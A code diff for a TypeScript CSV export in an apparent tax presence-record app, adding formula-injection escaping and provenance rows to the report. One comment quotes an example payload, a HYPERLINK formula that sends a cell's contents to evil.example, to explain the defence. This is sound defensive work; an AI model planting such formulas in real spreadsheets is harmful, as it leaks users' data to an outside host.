@@ -1,4 +1,5 @@
 import type { TaxReport } from "./tax-report";
+import { SEED_LAST_VERIFIED } from "@/lib/cities";
 
 /**
  * The line that must appear on every export, on every PDF page, and on screen.
@@ -11,9 +12,23 @@ export function reportFileName(year: number, ext: string): string {
   return `presence-record-${year}.${ext}`;
 }
 
+/**
+ * Characters that make Excel, LibreOffice and Google Sheets treat a cell as a
+ * FORMULA rather than text. A trip note reading
+ * `=HYPERLINK("https://evil.example/?"&A1,"Click")` would execute on open —
+ * CSV injection, and the same class of bug as an unchecked `javascript:` URL:
+ * user input becoming code in another program.
+ *
+ * Quoting alone does NOT help; spreadsheets parse formulas inside quotes.
+ * Prefixing with an apostrophe forces text and is stripped on display.
+ */
+const FORMULA_TRIGGERS = /^[=+\-@\t\r]/;
+
 function csvCell(value: string | number | boolean | null): string {
   const s = value === null ? "" : String(value);
-  return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
+  // Numbers stay numeric — only strings can carry a formula.
+  const safe = typeof value === "string" && FORMULA_TRIGGERS.test(s) ? `'${s}` : s;
+  return /[",\n\r]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
 }
 
 function csvRows(rows: (string | number | boolean | null)[][]): string {
@@ -27,6 +42,13 @@ export function taxReportToCsv(report: TaxReport): string {
   rows.push([`Presence record ${report.year}`]);
   rows.push([REPORT_DISCLAIMER]);
   rows.push([`Generated ${report.generatedAt}`]);
+  // Provenance: which arithmetic produced these figures. Without it, a number
+  // queried months later cannot be reproduced or explained.
+  rows.push([`Counting method version ${report.methodVersion}`]);
+  rows.push([`Country dataset verified ${SEED_LAST_VERIFIED}`]);
+  rows.push([]);
+  rows.push(["HOW THESE DAYS WERE COUNTED"]);
+  for (const note of report.methodNotes) rows.push([note]);
   rows.push([]);
 
   rows.push(["PRESENCE BY COUNTRY"]);
